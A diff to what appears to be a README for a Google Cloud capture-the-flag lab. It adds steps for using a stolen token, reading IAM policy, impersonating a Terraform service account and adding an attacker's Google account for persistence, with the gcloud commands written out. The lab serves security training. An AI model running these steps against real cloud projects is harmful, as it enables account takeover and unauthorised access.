@@ -291,7 +291,7 @@ Useful commands and tools:
 - `curl -H "Authorization:Bearer <token>" https://...`
 - [Metadata server](https://cloud.google.com/functions/docs/securing/function-identity#access-tokens)
 
-### Challenge 5: In the shoes of an admin
+### Challenge 5: Admin Impersonation
 
 You extracted a new access token! Let's see what this one can do.  
 You can use the tokeninfo endpoint again to find out:  
@@ -299,8 +299,66 @@ You can use the tokeninfo endpoint again to find out:
 Cloud functions by default are also using the compute engine default service account - but with the full `cloud-platform` access scope!  
 
 That should get you a set of nice new permissions on this GCP project.  
-You can view them using this command:  
-`gcloud projects get-iam-policy <project-id> --access-token-file <path-to-token-file>`
+You can tell gcloud to use your new token by setting it as environment variable:  
+`export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>`  
+
+Now, let's try to list the IAM policy on this GCP project to see which project-level access your account has:  
+`gcloud projects get-iam-policy <project-id>`
+
+You are Editor on this project which allows you read and write access to almost all resources.  
+Congratulations! You compromised this GCP project.  
+
+**Bonus Challenge:**  
+There is one last level of control you can achieve - gaining persistent access!  
+Wouldn't it be nice if you could add your own Google account to this project?  
+You can try to set an IAM binding on the project level. But while the compute account you compromised is powerful, it can't modify the IAM settings on the project.  
+But maybe another service account can?  
+
+Note: In this CTF challenge the only role you can grant your own Google account on the project level is "role/viewer".  
+
+<details>
+  <summary>Hint 1</summary>
+
+    When listing the service accounts on the project, one sounds like a good target: The terraform pipeline project admin account.  
+    Check if your compute service account can impersonate this account:
+    `gcloud iam service-accounts get-iam-policy <terraform account>`  
+    It does have the serviceAccountTokenCreator role, allowing service account impersonation!
+
+</details>
+
+<details>
+  <summary>Hint 2</summary>
+
+    By impersonation a service account, you can leverage the permissions that this account has.  
+    When listing the IAM bindings on the project again, the terraform account has a role that sounds intriguing: Terraform Pipeline Project Admin.  
+    This is a custom role the developers created for their terraform pipeline.  
+    Let's see what permissions it contains:  
+    `gcloud iam roles describe TerraformPipelineProjectAdmin --project <project-id>`  
+    Perfect! The account that you can impersonate, can modify the IAM bindings on this GCP project.  
+
+</details>
+
+<details>
+  <summary>Hint 3</summary>
+
+    Add your own Google Account to the GCP project by running:  
+    `gcloud projects add-iam-policy-binding <project-id> --member=user:<your Google account> --role=roles/viewer --impersonate-service-account <terraform pipeline account>`
+
+</details>
+
+When you completed the bonus challenge, you should be able to access this project in the cloud console in your browser.  
+Log in with the Google account you just added.  
+
+You finished the challenge and pwnd the vulnerable Google Cloud Project!
+
+Useful commands and tools:
+
+
+- list the IAM bindings on project level: `gcloud projects get-iam-policy <project-id>`
+- list service accounts: `gcloud iam service-accounts list` 
+- get IAM bindings showing who can control this service account: `gcloud iam service-accounts get-iam-policy <service account>`
+
+
 
 Useful commands and tools:
 
